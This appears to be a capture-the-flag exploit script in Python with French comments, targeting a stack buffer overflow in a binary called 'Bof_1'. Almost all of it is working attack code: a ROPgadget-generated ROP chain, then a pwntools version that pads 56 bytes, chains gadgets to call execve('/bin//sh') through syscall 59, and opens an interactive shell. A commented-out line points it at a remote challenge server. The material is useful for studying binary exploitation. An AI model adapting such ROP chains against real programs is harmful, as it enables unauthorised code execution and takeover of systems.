# ROPchain générée avec la commande suivante :
# $ ROPgadget --binary ./Bof_1 --ropchain

"""
  #!/usr/bin/env python2
	# execve generated by ROPgadget

	from struct import pack

	# Padding goes here
	p = ''

	p += pack('<Q', 0x000000000040880e) # pop rsi ; ret
	p += pack('<Q', 0x00000000004cc0e0) # @ .data
	p += pack('<Q', 0x000000000040302c) # pop rax ; ret
	p += '/bin//sh'
	p += pack('<Q', 0x00000000004502f5) # mov qword ptr [rsi], rax ; ret
	p += pack('<Q', 0x000000000040880e) # pop rsi ; ret
	p += pack('<Q', 0x00000000004cc0e8) # @ .data + 8
	p += pack('<Q', 0x00000000004439c9) # xor rax, rax ; ret
	p += pack('<Q', 0x00000000004502f5) # mov qword ptr [rsi], rax ; ret
	p += pack('<Q', 0x0000000000401ece) # pop rdi ; ret
	p += pack('<Q', 0x00000000004cc0e0) # @ .data
	p += pack('<Q', 0x000000000040880e) # pop rsi ; ret
	p += pack('<Q', 0x00000000004cc0e8) # @ .data + 8
	p += pack('<Q', 0x000000000048ef5b) # pop rdx ; pop rbx ; ret
	p += pack('<Q', 0x00000000004cc0e8) # @ .data + 8
	p += pack('<Q', 0x4141414141414141) # padding
	p += pack('<Q', 0x00000000004439c9) # xor rax, rax ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
  [...]
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000040120e) # syscall
"""

# On peut alors remplacer :
# - les pack('<Q', ...) de struct par p64() de pwntools
# - le "xor rax, rax" suivit de 59 fois "add rax, 1" par un "pop rax" suivit de la valeur 59 pour mettre rax à 59 de manière plus efficace
# (le syscall n° 59 correspondant à execve en x86_64)

from pwn import *

elf = process('./Bof_1')
#elf = remote('144.217.73.235', 22949)

p = b"A"*56
p += p64(0x000000000040880e) # pop rsi ; ret
p += p64(0x00000000004cc0e0) # @ .data
p += p64(0x000000000040302c) # pop rax ; ret
p += b'/bin//sh'
p += p64(0x00000000004502f5) # mov qword ptr [rsi], rax ; ret
p += p64(0x000000000040880e) # pop rsi ; ret
p += p64(0x00000000004cc0e8) # @ .data + 8
p += p64(0x00000000004439c9) # xor rax, rax ; ret
p += p64(0x00000000004502f5) # mov qword ptr [rsi], rax ; ret
p += p64(0x0000000000401ece) # pop rdi ; ret
p += p64(0x00000000004cc0e0) # @ .data
p += p64(0x000000000040880e) # pop rsi ; ret
p += p64(0x00000000004cc0e8) # @ .data + 8
p += p64(0x000000000048ef5b) # pop rdx ; pop rbx ; ret
p += p64(0x00000000004cc0e8) # @ .data + 8
p += p64(0x4141414141414141) # padding
p += p64(0x000000000040302c) # pop rax ; ret
p += p64(59) # rax = 59
p += p64(0x000000000040120e) # syscall

elf.sendline(p)
elf.interactive()

# On récupère ainsi un shell et on peut cat le flag.txt !
